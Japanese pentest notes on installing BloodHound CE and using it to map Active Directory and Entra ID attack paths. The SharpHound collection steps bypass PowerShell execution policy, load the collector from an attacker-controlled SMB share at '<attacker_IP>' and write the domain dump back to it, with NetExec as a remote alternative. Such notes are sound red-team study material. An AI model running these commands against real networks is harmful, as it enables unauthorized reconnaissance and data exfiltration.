# 目的

Active DirectoryやEntra ID（旧称：Azure AD）の攻撃ベクターを見つけるために使うドメインマップを作成する。
（ADにおけるGoogle Mapのようなもの。）

---

# BCE(BloodHound Community Edtition)インストール手順

2025年10月現在、インターネットでは旧来のBloodHound legacyとBloodHound Community Editionの説明がごちゃ混ぜになっているため、BCEのインストール手順をまとめる

1. dockerのインストール
```zsh
sudo apt update && sudo apt install -y docker.io && sudo apt install -y docker-compose
```

2. Docker起動時に毎回sudoを入力しなくてもいいように、自身をdockerのグループに追加
```zsh
sudo usermod -aG docker $USER

# 設定変更反映のため、ログアウト→ログイン
shutdown -r now

# 所属グループ確認
groups
```
↓出力例：末尾にdockerが追加
```
<username> adm dialout cdrom floppy sudo audio dip video plugdev users netdev bluetooth lpadmin wireshark scanner kaboxer docker
```

3. Dockerサービスの起動と自動起動の有効化
```zsh
sudo systemctl start docker
sudo systemctl enable docker
```

4. Bloodhound CEのインストール：[Install BloodHound CE - SPECTEROPS](https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart#install-bloodhound-ce)

---

# ２回目以降の起動・停止方法

初回インストール時はBloodHoundが起動しているが、２回目以降はDocker Composeでサービスを起動する必要がある。

1. `docker-compose.yml `が格納されているディレクトリにcd
```zsh
cd ~/.config/bloodhound
```

2. BCEのコンテナ起動
```zsh
docker compose up -d
```
- `-d`：バックグラウンドでdaemonのように動作する

3. 次のアドレスにアクセスすれば使用可能になる
```url
http://127.0.0.1:8080/ui
```
- デフォルトは8080ポートだが、自分はBurp Suiteとの競合を避けるため、[🐶Bloodhound](#おまけ：起動ポート8080の変更)で9999へ変更した
- "email"はデフォルトではadminで、パスワードは任意（英数字記号混在）

4. BCEのコンテナ停止
```zsh
docker compose down
```
- シャットダウンでも停止する

---

# データの収集・分析準備

Legacyでは、BloodHoundとSharpHoundの互換性に気をつける必要があったが、CEでは互換性のあるSharpHoundがDownload Collectorsの中にある

1. BloodHoundを起動し、Download Collectorsからデータ収集ツールをダウンロードする
	- Active Directoryに対しデータ収集：SharpHound
	- Entra IDに対しデータ収集：AzureHound

![](../Images/Pasted%20image%2020251006071117.png)

$$Download　Collectorsのページ$$

2. zipファイルを解凍する（自分は`/opt/bloodhound`配下に解凍）

---

# データの収集

- 同じドメインであれば、基本的に**1度の実行で良い**
	- Domain Admins以外のユーザーで繰り返しSharpHoundを実行しても結果に大差ない
- 💡ターゲットに侵入できていない場合は、リモートからNetExecを使用する

1. 攻撃者のマシン上でSMB共有を用意し、ファイル送受信の準備をする
	- [ファイル操作、ユーティリティ](../Cheatsheet/Common/ファイル操作、ユーティリティ.md#Windows%20→%20Linux%20w/%20SMB)
```zsh
# smb共有用ディレクトリの作成
mkdir <共有用のディレクトリ>

# sharphoundの用意
cp /opt/bloodhound/SharpHound.ps1 <共有用のディレクトリへのパス>

# smbサーバーのセットアップ
impacket-smbserver -smb2support -username <username> -password <password> share <共有用のディレクトリへのパス>
```

2. ターゲットのマシン上でSharpHoundをインポートし、スキャンを実行する
	- [ファイル操作、ユーティリティ](../Cheatsheet/Common/ファイル操作、ユーティリティ.md#SMB)
```powershell
powershell -ep bypass

# smb共有の利用
net use \\<attacker_IP>\share /user:<username> <password>

# 関数の読み込み
Import-Module \\<attacker_IP>\share\SharpHound.ps1

# 全データの収集（※ローカルグループポリシーは除く）
Invoke-BloodHound -CollectionMethod All -OutputDirectory \\<attacker_IP>\share -ZipFileName '<filename>.zip'
```

> [!INFO]
> - WinRM接続など、インタラクティブなシェルが使えない場合は [🐶Bloodhound](#SharpHoundの実行エラーとその対策)を参照 
> - Tunneling環境では手間だがSharpHoundを転送、結果ファイルを転送させる
> 	- `net use`ではポート指定ができないため、Ligolo-ngのListenerで445以外を指定してもSMB接続ができないし、また、Agentが445を使っているとき、Listnerを445に立てて、ということができない
> - csvファイルは使えない（BCEのバージョンが1.xxなら使えるが、古い）
> - ローカルGPOは収集できない

3. 攻撃者のマシンに戻り、BloodHoundのAdministration > File IngestでUpload Fileを実行し、SharpHoundの実行結果であるzipファイルをアップロードする

![](../Images/Pasted%20image%2020251006074057.png)

$$File　IngestのStatusがCompleteになれば分析準備OK$$

- 取り込んだデータの削除は、Administration > Database Managementから可能

---

# BloodHoundの基本的な機能

## nodeについて

- [About BloodHound Nodes](https://bloodhound.specterops.io/resources/nodes/overview)
- ノードをクリックすると、エンティティパネルが表示され、オブジェクトの情報がわかる

| オブジェクトについての情報           | 説明                                  |
| ----------------------- | ----------------------------------- |
| Object Information      | DNやSIDなど、オブジェクトに関する情報すべて            |
| Sessions                | オブジェクトがログオンしている対象を表示                |
| Members                 | グループのメンバー                           |
| Member of               | このオブジェクトがどのグループに所属するか               |
| Local Admin Privileges  | オブジェクトがローカル管理者権限をもっているもの            |
| Execution Privileges    | あるオブジェクトに対するリモートコマンド実行権限            |
| Inbound Object Control  | 他のオブジェクトがこのオブジェクトに対してどのような権限を持っているか |
| Outbound Object Control | このオブジェクトが他のオブジェクトに対してどのような権限を持っているか |

![](../Images/Pasted%20image%2020251007072812.png)

$$エンティティパネル$$

- ノードを右クリックすると、Add to Owned（侵害済みリストに追加）などが可能
	- 💀：Ownedリストに追加されたノードを意味する
	- アタックベクターを可視化するため、侵害したユーザーは==必ずAdd to Ownedする==こと

![](../Images/Pasted%20image%2020251007071811.png)

- 💎："HIGH VALUE"を意味し、特に重要なオブジェクトや侵害できると大きなメリットがあるオブジェクトを指す

![](../Images/Pasted%20image%2020251007064333.png)

$$ノードのアイコンの意味$$

## edgeについて

- [About BloodHound Edges](https://bloodhound.specterops.io/resources/edges/overview)
- エッジとは、あるノードを別のノードに接続するリンク（関係）として表現
- エッジの方向は攻撃または特権の方向を示す
- エッジの名前をクリックすると、エンティティパネルに以下の情報が表示される
	- Relationship information：エッジについての情報
	- ==Abuse：レッドチームがエッジの特権を活用して目標を達成する方法==
		- 詳細は公式ドキュメントでEdgeの名前を検索
		- ⚠️古いエクスプロイトの場合もあるので、エクスプロイト技法については公式ドキュメントを読む
	- Opsec Considerations：レッドチームメンバーが検知回避で考慮すべき点など

![](../Images/Pasted%20image%2020251007064618.png)

$$edgeのプロパティを表示$$

- その他の情報は、公式ドキュメントの「🔗[Resources](https://bloodhound.specterops.io/resources/overview)」を閲覧

## Explorer

### Search

- 検索機能
- ノードについてのラベルをつけると、そのラベルに該当するオブジェクトに絞ることができる
	- [nodeについて](#nodeについて)

![](../Images/Pasted%20image%2020251007065722.png)

$$groupラベルでadminとつくグループのみを検索している$$

### PATHFINDING

- 指定したStart NodeからDestination Nodeまでの侵害経路をグラフ化する
	- 存在しない場合はPATH NOT FINDING(存在しないと表示された場合でも[💥Lateral Movement & Persistance in AD](../Cheatsheet/🪟Windows/Active%20Directory/💥Lateral%20Movement%20&%20Persistance%20in%20AD.md)のテクニックで横展開可能な場合も多い)

### CYPHER

- [Search With Cypher - SPECTEROPS](https://bloodhound.specterops.io/analyze-data/cypher-search)
- 関連ノート：[Cypher文法](../Misc/Cypher文法.md)

- クエリを使用して、任意の情報を表示する
- 「Saved Query」で定義済みのクエリを使用可能
> [!TIP] 便利な Saved Query
> - Shortest paths from Owned objects
> - AS-REP Roastable users (DontReqPreAuth)
> - All Kerberoastable users

![](../Images/Pasted%20image%2020251006124753.png)

$$定義済みクエリですべてのドメインadminを列挙しているイメージ$$

---

# おまけ：起動ポート8080の変更

以下のディレクトリに保存されている３つのファイルの8080を任意のポートに書き換える
```zsh
cd ~/.config/bloodhound
```
- →自分は9999に変更した

---

# トラブルシューティング

## SharpHoundの実行エラーとその対策

- no valid module file was found：SMB接続がうまくいっていないか、ファイルパスのミス
- SharpHound.ps1 is not digitally signed：Execution policyがバイパスできていない
	- WinRM接続では`powershell -ep bypass -c 'import-module...; Invoke-Blood...'`とするか、リバースシェルを確立する（[5985(WinRM), 47001(WMI) - HTTP](../Cheatsheet/Ports%20-%20Service/5985(WinRM),%2047001(WMI)%20-%20HTTP.md#WinRMポートの活用)）
- The .Net Runtime is not compatible or 何も出力しない：SharpHoundと.Netの互換性が原因であるため、NetExecなどの別のデータ収集ツールを使う
```zsh
# ldapとdnsは同一のIPであることが多い
# DCのIPに対して実行する必要がある
netexec ldap <LDAP_server_IP> -u <username> -p '<password>' --bloodhound --collection All --dns-server <DNS_server_IP>
```
